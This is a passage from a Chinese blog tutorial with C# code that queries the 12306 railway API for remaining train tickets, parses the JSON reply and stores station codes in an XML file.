class="comment">//软卧</span></span><br><span class="line">       <span class="keyword">private</span> <span class="built_in">string</span> dwNum = <span class="string">&quot;--&quot;</span>;<span class="comment">//动卧</span></span><br><span class="line">       <span class="keyword">private</span> <span class="built_in">string</span> ywNum = <span class="string">&quot;--&quot;</span>;<span class="comment">//硬卧</span></span><br><span class="line">       <span class="keyword">private</span> <span class="built_in">string</span> rzNum = <span class="string">&quot;--&quot;</span>;<span class="comment">//软座</span></span><br><span class="line">       <span class="keyword">private</span> <span class="built_in">string</span> yzNum = <span class="string">&quot;--&quot;</span>;<span class="comment">//硬座</span></span><br><span class="line">       <span class="keyword">private</span> <span class="built_in">string</span> wzNum = <span class="string">&quot;--&quot;</span>;<span class="comment">//无座</span></span><br><span class="line">       <span class="keyword">private</span> <span class="built_in">string</span> qtNum = <span class="string">&quot;--&quot;</span>;<span class="comment">//其他</span></span><br><span class="line">       <span class="keyword">private</span> <span class="built_in">string</span> identity = <span class="built_in">string</span>.Empty;<span class="comment">//车票类型(学生/成人)</span></span><br><span class="line">       <span class="keyword">public</span> <span class="built_in">string</span> TrainId &#123; <span class="keyword">get</span> &#123; <span class="keyword">return</span> trainid; &#125; <span class="keyword">set</span> &#123; trainid = <span class="keyword">value</span>; &#125; &#125;</span><br><span class="line">       <span class="keyword">public</span> <span class="built_in">string</span> FromStation &#123; <span class="keyword">get</span> &#123; <span class="keyword">return</span> fromstation; &#125; <span class="keyword">set</span> &#123; fromstation = <span class="keyword">value</span>; &#125; &#125;</span><br><span class="line">       <span class="keyword">public</span> <span class="built_in">string</span> ToStation &#123; <span class="keyword">get</span> &#123; <span class="keyword">return</span> totation; &#125; <span class="keyword">set</span> &#123; totation = <span class="keyword">value</span>; &#125; &#125;</span><br><span class="line">       <span class="keyword">public</span> <span class="built_in">string</span> TicketDate &#123; <span class="keyword">get</span> &#123; <span class="keyword">return</span> ticketdate; &#125; <span class="keyword">set</span> &#123; ticketdate = <span class="keyword">value</span>; &#125; &#125;</span><br><span class="line">       <span class="keyword">public</span> <span class="built_in">string</span> StartTime &#123; <span class="keyword">get</span> &#123; <span class="keyword">return</span> starttime; &#125; <span class="keyword">set</span> &#123; starttime = <span class="keyword">value</span>; &#125; &#125;</span><br><span class="line">       <span class="keyword">public</span> <span class="built_in">string</span> ArriveTime &#123; <span class="keyword">get</span> &#123; <span class="keyword">return</span> arrivetime; &#125;<span class="keyword">set</span> &#123; arrivetime = <span class="keyword">value</span>; &#125; &#125;</span><br><span class="line">       <span class="keyword">public</span> <span class="built_in">string</span> LastedTime &#123; <span class="keyword">get</span> &#123; <span class="keyword">return</span> lastedtime; &#125; <span class="keyword">set</span> &#123; lastedtime = <span class="keyword">value</span>; &#125; &#125;</span><br><span class="line">       <span class="keyword">public</span> <span class="built_in">string</span> TzNum &#123; <span class="keyword">get</span> &#123; <span class="keyword">return</span> tzNum; &#125; <span class="keyword">set</span> &#123; tzNum = <span class="keyword">value</span>; &#125; &#125;</span><br><span class="line">       <span class="keyword">public</span> <span class="built_in">string</span> YdNum &#123; <span class="keyword">get</span> &#123; <span class="keyword">return</span> ydNum; &#125; <span class="keyword">set</span> &#123; ydNum = <span class="keyword">value</span>; &#125; &#125;</span><br><span class="line">       <span class="keyword">public</span> <span class="built_in">string</span> EdNum &#123; <span class="keyword">get</span> &#123; <span class="keyword">return</span> edNum; &#125; <span class="keyword">set</span> &#123; edNum = <span class="keyword">value</span>; &#125; &#125;</span><br><span class="line">       <span class="keyword">public</span> <span class="built_in">string</span> GrwNum &#123; <span class="keyword">get</span> &#123; <span class="keyword">return</span> grwNum; &#125; <span class="keyword">set</span> &#123; grwNum = <span class="keyword">value</span>; &#125; &#125;</span><br><span class="line">       <span class="keyword">public</span> <span class="built_in">string</span> RwNum &#123; <span class="keyword">get</span> &#123; <span class="keyword">return</span> rwNum; &#125; <span class="keyword">set</span> &#123; rwNum = <span class="keyword">value</span>; &#125; &#125;</span><br><span class="line">       <span class="keyword">public</span> <span class="built_in">string</span> DwNum &#123; <span class="keyword">get</span> &#123; <span class="keyword">return</span> dwNum; &#125; <span class="keyword">set</span> &#123; dwNum = <span class="keyword">value</span>; &#125; &#125;</span><br><span class="line">       <span class="keyword">public</span> <span class="built_in">string</span> YwNum &#123;<span class="keyword">get</span>&#123; <span class="keyword">return</span> ywNum; &#125;<span class="keyword">set</span>&#123; ywNum = <span class="keyword">value</span>; &#125; &#125;</span><br><span class="line">       <span class="keyword">public</span> <span class="built_in">string</span> RzNum &#123;<span class="keyword">get</span>&#123; <span class="keyword">return</span> rzNum; &#125;<span class="keyword">set</span>&#123; rzNum = <span class="keyword">value</span>; &#125; &#125;</span><br><span class="line">       <span class="keyword">public</span> <span class="built_in">string</span> YzNum &#123;<span class="keyword">get</span>&#123; <span class="keyword">return</span> yzNum; &#125;<span class="keyword">set</span>&#123; yzNum = <span class="keyword">value</span>; &#125; &#125;</span><br><span class="line">       <span class="keyword">public</span> <span class="built_in">string</span> WzNum &#123;<span class="keyword">get</span>&#123; <span class="keyword">return</span> wzNum; &#125;<span class="keyword">set</span>&#123; wzNum = <span class="keyword">value</span>; &#125; &#125;</span><br><span class="line">       <span class="keyword">public</span> <span class="built_in">string</span> QtNum &#123;<span class="keyword">get</span>&#123; <span class="keyword">return</span> qtNum; &#125;<span class="keyword">set</span>&#123; qtNum = <span class="keyword">value</span>; &#125; &#125;</span><br><span class="line">       <span class="keyword">public</span> <span class="built_in">string</span> Identity &#123; <span class="keyword">get</span> &#123; <span class="keyword">return</span> identity; &#125;<span class="keyword">set</span> &#123; identity = <span class="keyword">value</span>; &#125; &#125;</span><br><span class="line">       <span class="meta">#<span class="keyword">endregion</span></span></span><br><span class="line">       <span class="function"><span class="keyword">public</span> <span class="title">Ticket</span>()</span> &#123; &#125;</span><br><span class="line"></span><br><span class="line">       <span class="function"><span class="keyword">public</span> Dictionary&lt;<span class="built_in">string</span>, <span class="built_in">string</span>&gt; <span class="title">getMap</span>()</span></span><br><span class="line">       &#123;</span><br><span class="line">           Dictionary&lt;<span class="built_in">string</span>, <span class="built_in">string</span>&gt; result = <span class="keyword">new</span> Dictionary&lt;<span class="built_in">string</span>, <span class="built_in">string</span>&gt;();</span><br><span class="line">           result.Add(<span class="string">&quot;车次&quot;</span>, trainid);</span><br><span class="line">           result.Add(<span class="string">&quot;出发站&quot;</span>, FromStation);</span><br><span class="line">           result.Add(<span class="string">&quot;到达站&quot;</span>, ToStation);</span><br><span class="line">           result.Add(<span class="string">&quot;发车时间&quot;</span>, StartTime);</span><br><span class="line">           result.Add(<span class="string">&quot;到达时间&quot;</span>, ArriveTime);</span><br><span class="line">           result.Add(<span class="string">&quot;历时&quot;</span>, LastedTime);</span><br><span class="line">           result.Add(<span class="string">&quot;特等座&quot;</span>, TzNum);</span><br><span class="line">           result.Add(<span class="string">&quot;一等座&quot;</span>, YdNum);</span><br><span class="line">           result.Add(<span class="string">&quot;二等座&quot;</span>, EdNum);</span><br><span class="line">           result.Add(<span class="string">&quot;高级软卧&quot;</span>, GrwNum);</span><br><span class="line">           result.Add(<span class="string">&quot;软卧&quot;</span>, RwNum);</span><br><span class="line">           result.Add(<span class="string">&quot;动卧&quot;</span>, DwNum);</span><br><span class="line">           result.Add(<span class="string">&quot;硬卧&quot;</span>, YwNum);</span><br><span class="line">           result.Add(<span class="string">&quot;软座&quot;</span>, RzNum);</span><br><span class="line">           result.Add(<span class="string">&quot;硬座&quot;</span>, YzNum);</span><br><span class="line">           result.Add(<span class="string">&quot;无座&quot;</span>, WzNum);</span><br><span class="line">           result.Add(<span class="string">&quot;其他&quot;</span>, QtNum);</span><br><span class="line">           <span class="keyword">return</span> result;</span><br><span class="line">       &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="解析JSON"><a href="#解析JSON" class="headerlink" title="解析JSON"></a>解析JSON</h3><p><img data-src="/images/trainticket3.jpg" alt="JSON格式的字符串"><br>返回的报文为一个JSON格式的字符串，里面包含有各类车票信息、发车时间以及历时，为了对其进行解析，我们需要下载一个用于解析JSON的类库(下载地址:<a href="https://archive.codeplex.com/?p=json">Newtonsoft.Json.dll</a>)</p>
<figure class="highlight csharp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> Ticket[] <span class="title">SpiderTicket</span>(<span class="params"><span class="built_in">string</span> date, <span class="built_in">string</span> <span class="keyword">from</span>, <span class="built_in">string</span> to, <span class="built_in">string</span> id</span>)</span></span><br><span class="line"> &#123;</span><br><span class="line">     HttpWebRequest request;</span><br><span class="line">     HttpWebResponse response;</span><br><span class="line"></span><br><span class="line">     <span class="built_in">string</span> url = <span class="string">&quot;https://kyfw.12306.cn/otn/leftTicket/query?leftTicketDTO.train_date=&#123;0&#125;&amp;leftTicketDTO.from_station=&#123;1&#125;&amp;leftTicketDTO.to_station=&#123;2&#125;&amp;purpose_codes=&#123;3&#125;&quot;</span>;</span><br><span class="line">     url = <span class="built_in">string</span>.Format(url, date, <span class="keyword">from</span>, to, id);</span><br><span class="line"></span><br><span class="line">     request = (HttpWebRequest)WebRequest.Create(url);</span><br><span class="line">     request.Method = <span class="string">&quot;GET&quot;</span>;</span><br><span class="line">     request.Credentials = CredentialCache.DefaultCredentials;</span><br><span class="line">     request.UserAgent = <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Safari/537.36&quot;</span>;</span><br><span class="line"></span><br><span class="line">     <span class="built_in">string</span> str = <span class="built_in">string</span>.Empty;</span><br><span class="line">     <span class="keyword">try</span></span><br><span class="line">     &#123;</span><br><span class="line">         response = (HttpWebResponse)request.GetResponse();</span><br><span class="line">         <span class="keyword">if</span> (response.StatusCode == HttpStatusCode.OK)</span><br><span class="line">         &#123;</span><br><span class="line">             StreamReader sr = <span class="keyword">new</span> StreamReader(response.GetResponseStream(), Encoding.GetEncoding(<span class="string">&quot;UTF-8&quot;</span>));</span><br><span class="line">             str = sr.ReadToEnd();</span><br><span class="line">             sr.Close();</span><br><span class="line">             response.Close();<span class="comment">//关闭response响应流</span></span><br><span class="line">         &#125;</span><br><span class="line">         <span class="keyword">else</span></span><br><span class="line">             <span class="keyword">throw</span> <span class="keyword">new</span> Exception();</span><br><span class="line">     &#125;</span><br><span class="line">     <span class="keyword">catch</span> (Exception e)</span><br><span class="line">     &#123;</span><br><span class="line">         Console.WriteLine(e.Message);</span><br><span class="line">     &#125;</span><br><span class="line"></span><br><span class="line">     Dictionary&lt;<span class="built_in">string</span>, <span class="built_in">string</span>&gt; map=<span class="keyword">new</span> Dictionary&lt;<span class="built_in">string</span>, <span class="built_in">string</span>&gt;();<span class="comment">//保存返回的JSON串中的车站代码与车站名之间的映</span></span><br><span class="line">     ArrayList AllTicket = <span class="keyword">new</span> ArrayList();<span class="comment">//所有的车票信息</span></span><br><span class="line"></span><br><span class="line">     JObject jo = (JObject)JsonConvert.DeserializeObject(str);</span><br><span class="line">     JToken <span class="keyword">record</span> = jo[<span class="string">&quot;data&quot;</span>][<span class="string">&quot;map&quot;</span>];</span><br><span class="line">     <span class="keyword">foreach</span> (JProperty item <span class="keyword">in</span> <span class="keyword">record</span>)</span><br><span class="line">     &#123;</span><br><span class="line">         map.Add(item.Name.ToString(), item.Value.ToString());</span><br><span class="line">     &#125;</span><br><span class="line"></span><br><span class="line">     <span class="keyword">record</span> = jo[<span class="string">&quot;data&quot;</span>][<span class="string">&quot;result&quot;</span>];</span><br><span class="line">     <span class="keyword">foreach</span> (<span class="built_in">string</span> s <span class="keyword">in</span> <span class="keyword">record</span>)</span><br><span class="line">     &#123;</span><br><span class="line">         <span class="built_in">string</span>[] result = s.Split(<span class="string">&#x27;|&#x27;</span>);</span><br><span class="line">         Ticket t = <span class="keyword">new</span> Ticket();</span><br><span class="line">         t.TrainId = result[<span class="number">3</span>];</span><br><span class="line">         t.FromStation = map[result[<span class="number">6</span>]];</span><br><span class="line">         t.ToStation = map[result[<span class="number">7</span>]];</span><br><span class="line">         t.StartTime = result[<span class="number">8</span>];</span><br><span class="line">         t.ArriveTime = result[<span class="number">9</span>];</span><br><span class="line">         t.LastedTime = result[<span class="number">10</span>];</span><br><span class="line">         t.TicketDate = result[<span class="number">13</span>];</span><br><span class="line">         t.DwNum = result[<span class="number">33</span>] != <span class="string">&quot;&quot;</span> ? result[<span class="number">33</span>] : t.DwNum;</span><br><span class="line">         t.TzNum = result[<span class="number">32</span>] != <span class="string">&quot;&quot;</span> ? result[<span class="number">32</span>] : t.TzNum;</span><br><span class="line">         t.YdNum = result[<span class="number">31</span>] != <span class="string">&quot;&quot;</span> ? result[<span class="number">31</span>] : t.YdNum;</span><br><span class="line">         t.EdNum = result[<span class="number">30</span>] != <span class="string">&quot;&quot;</span> ? result[<span class="number">30</span>] : t.EdNum;</span><br><span class="line">         t.YzNum = result[<span class="number">29</span>] != <span class="string">&quot;&quot;</span> ? result[<span class="number">29</span>] : t.YzNum;</span><br><span class="line">         t.YwNum = result[<span class="number">28</span>] != <span class="string">&quot;&quot;</span> ? result[<span class="number">28</span>] : t.YwNum;</span><br><span class="line">         t.WzNum = result[<span class="number">26</span>] != <span class="string">&quot;&quot;</span> ? result[<span class="number">26</span>] : t.WzNum;</span><br><span class="line">         t.RzNum = result[<span class="number">24</span>] != <span class="string">&quot;&quot;</span> ? result[<span class="number">24</span>] : t.RzNum;</span><br><span class="line">         t.RwNum = result[<span class="number">23</span>] != <span class="string">&quot;&quot;</span> ? result[<span class="number">23</span>] : t.RwNum;</span><br><span class="line">         t.GrwNum = result[<span class="number">21</span>] != <span class="string">&quot;&quot;</span> ? result[<span class="number">21</span>] : t.GrwNum;</span><br><span class="line">         AllTicket.Add(t);</span><br><span class="line">     &#125;</span><br><span class="line">     Ticket[] All = <span class="keyword">new</span> Ticket[AllTicket.Count];</span><br><span class="line">     <span class="built_in">int</span> flag = <span class="number">0</span>;</span><br><span class="line">     <span class="keyword">foreach</span> (<span class="built_in">object</span> t <span class="keyword">in</span> AllTicket)</span><br><span class="line">     &#123;</span><br><span class="line">         All[flag++] = t <span class="keyword">as</span> Ticket;</span><br><span class="line">     &#125;</span><br><span class="line">     <span class="keyword">return</span> All;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>
<h2 id="效果图"><a href="#效果图" class="headerlink" title="效果图"></a>效果图</h2><p><img data-src="/images/spiderticket.jpg"><br><img data-src="/images/spiderticket2.jpg"><br>项目地址:<a href="https://github.com/ZhaoQi99/EasyLife/tree/Course_Design/">EasyLife</a></p>
<h2 id="参考博客"><a href="#参考博客" class="headerlink" title="参考博客"></a>参考博客</h2><p><a href="https://blog.csdn.net/xiahn1a/article/details/42584507">C#调用12306API做余票查询</a>(该参考博客中的方法已不可用)</p>
<h2 id="完整代码"><a href="#完整代码" class="headerlink" title="完整代码"></a>完整代码</h2><figure class="highlight csharp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">using</span> Newtonsoft.Json;</span><br><span class="line"><span class="keyword">using</span> Newtonsoft.Json.Linq;</span><br><span class="line"><span class="keyword">using</span> System;</span><br><span class="line"><span class="keyword">using</span> System.Collections;</span><br><span class="line"><span class="keyword">using</span> System.Collections.Generic;</span><br><span class="line"><span class="keyword">using</span> System.IO;</span><br><span class="line"><span class="keyword">using</span> System.Net;</span><br><span class="line"><span class="keyword">using</span> System.Text;</span><br><span class="line"><span class="keyword">using</span> System.Text.RegularExpressions;</span><br><span class="line"><span class="keyword">using</span> System.Xml;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Ticket</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">class</span> <span class="title">Program</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">StationNameXml</span>()</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">string</span> nowpath = Environment.CurrentDirectory;</span><br><span class="line">            <span class="keyword">if</span> (Directory.Exists(nowpath + <span class="string">&quot;/Data&quot;</span>) == <span class="literal">false</span>)</span><br><span class="line">                Directory.CreateDirectory(nowpath + <span class="string">&quot;/Data&quot;</span>);<span class="comment">//创建新路径</span></span><br><span class="line">            <span class="keyword">if</span> (File.Exists(nowpath + <span class="string">&quot;/Data/StationName.xml&quot;</span>) == <span class="literal">true</span>)</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">            HttpWebRequest request;</span><br><span class="line">            HttpWebResponse response;</span><br><span class="line"></span><br><span class="line">            <span class="built_in">string</span> url = <span class="string">@&quot;https://kyfw.12306.cn/otn/resources/js/framework/station_name.js?station_version=1.9055&quot;</span>;</span><br><span class="line"></span><br><span class="line">            request = (HttpWebRequest)WebRequest.Create(url);</span><br><span class="line">            request.Method = <span class="string">&quot;GET&quot;</span>;</span><br><span class="line">            request.Credentials = CredentialCache.DefaultCredentials;</span><br><span class="line">            request.UserAgent = <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Safari/537.36&quot;</span>;</span><br><span class="line"></span><br><span class="line">            <span class="built_in">string</span> str = <span class="built_in">string</span>.Empty;</span><br><span class="line">            <span class="keyword">try</span></span><br><span class="line">            &#123;</span><br><span class="line">                response = (HttpWebResponse)request.GetResponse();</span><br><span class="line">                <span class="keyword">if</span> (response.StatusCode == HttpStatusCode.OK)</span><br><span class="line">                &#123;</span><br><span class="line">                    StreamReader sr = <span class="keyword">new</span> StreamReader(response.GetResponseStream(), Encoding.GetEncoding(<span class="string">&quot;UTF-8&quot;</span>));</span><br><span class="line">                    str = sr.ReadToEnd();</span><br><span class="line">                    sr.Close();</span><br><span class="line">                    response.Close();<span class="comment">//关闭response响应流</span></span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> Exception();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">catch</span> (Exception e)</span><br><span class="line">            &#123;</span><br><span class="line">                Console.WriteLine(e.Message);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="built_in">string</span> pattern = <span class="string">@&quot;@\S&#123;2,5&#125;?[|](?&lt;Name&gt;\S&#123;1,8&#125;?)[|](?&lt;Code&gt;\S&#123;3,5&#125;?)[|]&quot;</span>;</span><br><span class="line">            Regex r = <span class="keyword">new</span> Regex(pattern, RegexOptions.ExplicitCapture);</span><br><span class="line"></span><br><span class="line">            XmlDocument xmldoc = <span class="keyword">new</span> XmlDocument();</span><br><span class="line">            XmlDeclaration xmldecl;</span><br><span class="line"></span><br><span class="line">            xmldecl = xmldoc.CreateXmlDeclaration(<span class="string">&quot;1.0&quot;</span>, <span class="string">&quot;UTF-8&quot;</span>, <span class="literal">null</span>);<span class="comment">//加入XML的声明段落</span></span><br><span class="line">            xmldoc.AppendChild(xmldecl);</span><br><span class="line"></span><br><span class="line">            XmlElement root = xmldoc.CreateElement(<span class="string">&quot;&quot;</span>, <span class="string">&quot;Dict&quot;</span>, <span class="string">&quot;&quot;</span>);<span class="comment">//加入一个根元素</span></span><br><span class="line">            xmldoc.AppendChild(root);</span><br><span class="line"></span><br><span class="line">            MatchCollection mc = r.Matches(str);</span><br><span class="line">            <span class="keyword">foreach</span> (Match m <span class="keyword">in</span> mc)</span><br><span class="line">            &#123;</span><br><span class="line">                GroupCollection <span class="keyword">group</span> = m.Groups;</span><br><span class="line">                XmlNode node = xmldoc.CreateNode(XmlNodeType.Element, <span class="string">&quot;Pair&quot;</span>, <span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">                XmlNode temp = xmldoc.CreateNode(XmlNodeType.Element, <span class="string">&quot;Station&quot;</span>, <span class="literal">null</span>);</span><br><span class="line">                temp.InnerText = <span class="keyword">group</span>[<span class="string">&quot;Name&quot;</span>].Value;</span><br><span class="line">                node.AppendChild(temp);</span><br><span class="line"></span><br><span class="line">                XmlNode temp2 = xmldoc.CreateNode(XmlNodeType.Element, <span class="string">&quot;Code&quot;</span>, <span class="literal">null</span>);</span><br><span class="line">                temp2.InnerText = <span class="keyword">group</span>[<span class="string">&quot;Code&quot;</span>].Value;</span><br><span class="line">                node.AppendChild(temp2);</span><br><span class="line"></span><br><span class="line">                root.AppendChild(node);</span><br><span class="line">            &#125;</span><br><span class="line">            xmldoc.Save(nowpath + <span class="string">&quot;/Data/&quot;</span> + <span class="string">&quot;StationName.xml&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="built_in">string</span> <span class="title">StationCode</span>(<span class="params"><span class="built_in">string</span> StationName</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            XmlDocument doc = <span class="keyword">new</span> XmlDocument();</span><br><span class="line">            doc.Load(Environment.CurrentDirectory + <span class="string">&quot;/Data/StationName.xml&quot;</span>);</span><br><span class="line">            XmlNodeList data = doc.DocumentElement.ChildNodes;</span><br><span class="line">            <span class="keyword">foreach</span> (XmlNode node <span class="keyword">in</span> data)</span><br><span class="line">            &#123;</span><br><span class="line">                XmlElement xe = (XmlElement)node;</span><br><span class="line">                XmlNodeList xnl0 = xe.ChildNodes;</span><br><span class="line">                <span class="built_in">string</span> s = xnl0.Item(<span class="number">0</span>).InnerText;</span><br><span class="line">                <span class="keyword">if</span> (s == StationName)</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="keyword">return</span> xnl0.Item(<span class="number">1</span>).InnerText;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">string</span>.Empty;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">       <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> Ticket[] <span class="title">SpiderTicket</span>(<span class="params"><span class="built_in">string</span> date, <span class="built_in">string</span> <span class="keyword">from</span>, <span class="built_in">string</span> to, <span class="built_in">string</span> id</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            HttpWebRequest request;</span><br><span class="line">            HttpWebResponse response;</span><br><span class="line"></span><br><span class="line">            <span class="built_in">string</span> url = <span class="string">&quot;https://kyfw.12306.cn/otn/leftTicket/query?leftTicketDTO.train_date=&#123;0&#125;&amp;leftTicketDTO.from_station=&#123;1&#125;&amp;leftTicketDTO.to_station=&#123;2&#125;&amp;purpose_codes=&#123;3&#125;&quot;</span>;</span><br><span class="line">            url = <span class="built_in">string</span>.Format(url, date, <span class="keyword">from</span>, to, id);</span><br><span class="line"></span><br><span class="line">            request = (HttpWebRequest)WebRequest.Create(url);</span><br><span class="line">            request.Method = <span class="string">&quot;GET&quot;</span>;</span><br><span class="line">            request.Credentials = CredentialCache.DefaultCredentials;</span><br><span class="line">            request.UserAgent = <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Safari/537.36&quot;</span>;</span><br><span class="line"></span><br><span class="line">            <span class="built_in">string</span> str = <span class="built_in">string</span>.Empty;</span><br><span class="line">            <span class="keyword">try</span></span><br><span class="line">            &#123;</span><br><span class="line">                response = (HttpWebResponse)request.GetResponse();</span><br><span class="line">                <span class="keyword">if</span> (response.StatusCode == HttpStatusCode.OK)</span><br><span class="line">                &#123;</span><br><span class="line">                    StreamReader sr = <span class="keyword">new</span> StreamReader(response.GetResponseStream(), Encoding.GetEncoding(<span class="string">&quot;UTF-8&quot;</span>));</span><br><span class="line">                    str = sr.ReadToEnd();</span><br><span class="line">                    sr.Close();</span><br><span class="line">                    response.Close();<span class="comment">//关闭response响应流</span></span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> Exception();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">catch</span> (Exception e)</span><br><span class="line">            &#123;</span><br><span class="line">                Console.WriteLine(e.Message);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            Dictionary&lt;<span class="built_in">string</span>, <span class="built_in">string</span>&gt; map=<span class="keyword">new</span> Dictionary&lt;<span class="built_in">string</span>, <span class="built_in">string</span>&gt;();<span class="comment">//保存返回的JSON串中的车站代码与车站名之间的映</span></span><br><span class="line">            ArrayList AllTicket = <span class="keyword">new</span> ArrayList();<span class="comment">//所有的车票信息</span></span><br><span class="line"></span><br><span class="line">            JObject jo = (JObject)JsonConvert.DeserializeObject(str);</span><br><span class="line">            JToken <span class="keyword">record</span> = jo[<span class="string">&quot;data&quot;</span>][<span class="string">&quot;map&quot;</span>];</span><br><span class="line">            <span class="keyword">foreach</span> (JProperty item <span class="keyword">in</span> <span class="keyword">record</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                map.Add(item.Name.ToString(), item.Value.ToString());</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">record</span> = jo[<span class="string">&quot;data&quot;</span>][<span class="string">&quot;result&quot;</span>];</span><br><span class="line">            <span class="keyword">foreach</span> (<span class="built_in">string</span> s <span class="keyword">in</span> <span class="keyword">record</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">string</span>[] result = s.Split(<span class="string">&#x27;|&#x27;</span>);</span><br><span class="line">                Ticket t = <span class="keyword">new</span> Ticket();</span><br><span class="line">                t.TrainId = result[<span class="number">3</span>];</span><br><span class="line">                t.FromStation = map[result[<span class="number">6</span>]];</span><br><span class="line">                t.ToStation = map[result[<span class="number">7</span>]];</span><br><span class="line">                t.StartTime = result[<span class="number">8</span>];</span><br><span class="line">                t.ArriveTime = result[<span class="number">9</span>];</span><br><span class="line">                t.LastedTime = result[<span class="number">10</span>];</span><br><span class="line">                t.TicketDate = result[<span class="number">13</span>];</span><br><span class="line">                t.DwNum = result[<span class="number">33</span>] != <span class="string">&quot;&quot;</span> ? result[<span class="number">33</span>] : t.DwNum;</span><br><span class="line">                t.TzNum = result[<span class="number">32</span>] != <span class="string">&quot;&quot;</span> ? result[<span class="number">32</span>] : t.TzNum;</span><br><span class="line">                t.YdNum = result[<span class="number">31</span>] != <span class="string">&quot;&quot;</span> ? result[<span class="number">31</span>] : t.YdNum;</span><br><span class="line">                t.EdNum = result[<span class="number">30</span>] != <span class="string">&quot;&quot;</span> ? result[<span class="number">30</span>] : t.EdNum;</span><br><span class="line">                t.YzNum = result[<span class="number">29</span>] != <span class="string">&quot;&quot;</span> ? result[<span class="number">29</span>] : t.YzNum;</span><br><span class="line">                t.YwNum = result[<span class="number">28</span>] != <span class="string">&quot;&quot;</span> ? result[<span class="number">28</span>] : t.YwNum;</span><br><span class="line">                t.WzNum = result[<span class="number">26</span>] != <span class="string">&quot;&quot;</span> ? result[<span class="number">26</span>] : t.WzNum;</span><br><span class="line">                t.RzNum = result[<span class="number">24</span>] != <span class="string">&quot;&quot;</span> ? result[<span class="number">24</span>] : t.RzNum;</span><br><span class="line">                t.RwNum = result[<span class="number">23</span>] != <span class="string">&quot;&quot;</span> ? result[<span class="number">23</span>] : t.RwNum;</span><br><span class="line">                t.GrwNum = result[<span class="number">21</span>] != <span class="string">&quot;&quot;</span> ? result[<span class="number">21</span>] : t.GrwNum;</span><br><span class="line">                AllTicket.Add(t);</span><br><span class="line">            &#125;</span><br><span class="line">            Ticket[] All = <span class="keyword">new</span> Ticket[AllTicket.Count];</span><br><span class="line">            <span class="built_in">int</span> flag = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">foreach</span> (<span class="built_in">object</span> t <span class="keyword">in</span> AllTicket)</span><br><span class="line">            &#123;</span><br><span class="line">                All[flag++] = t <span class="keyword">as</span> Ticket;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> All;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Main</span>(<span class="params"><span class="built_in">string</span>[] args</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            StationNameXml();</span><br><span class="line">            <span class="built_in">string</span> <span class="keyword">from</span> = <span class="string">&quot;上海&quot;</span>;</span><br><span class="line">            <span class="built_in">string</span> to = <span class="string">&quot;北京&quot;</span>;</span><br><span class="line">            Ticket[] All=<span class="keyword">new</span> Ticket[<span class="number">50</span>];</span><br><span class="line">            All=SpiderTicket(DateTime.Now.ToString(<span class="string">&quot;yyyy-MM-dd&quot;</span>), StationCode(<span class="keyword">from</span>), StationCode(to), <span class="string">&quot;ADULT&quot;</span>);</span><br><span class="line">            <span class="keyword">for</span>(<span class="built_in">int</span> i=<span class="number">0</span>;i&lt;All.Length;i++)</span><br><span class="line">            &#123;</span><br><span class="line">                Dictionary&lt;<span class="built_in">string</span>, <span class="built_in">string</span>&gt; map = <span class="keyword">new</span> Dictionary&lt;<span class="built_in">string</span>, <span class="built_in">string</span>&gt;();</span><br><span class="line">                map = All[i].getMap();</span><br><span class="line">                <span class="keyword">foreach</span> (<span class="built_in">object</span> j <span class="keyword">in</span> map.Keys)</span><br><span class="line">                    Console.Write(j.ToString()+<span class="string">&quot;:&quot;</span>+map[j.ToString()].ToString()+<span class="string">&quot; &quot;</span>);</span><br><span class="line">                Console.WriteLine();</span><br><span class="line">            &#125;</span><br><span class="line">            Console.Read();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
      <categories>
        <category>C#</category>
      </categories>
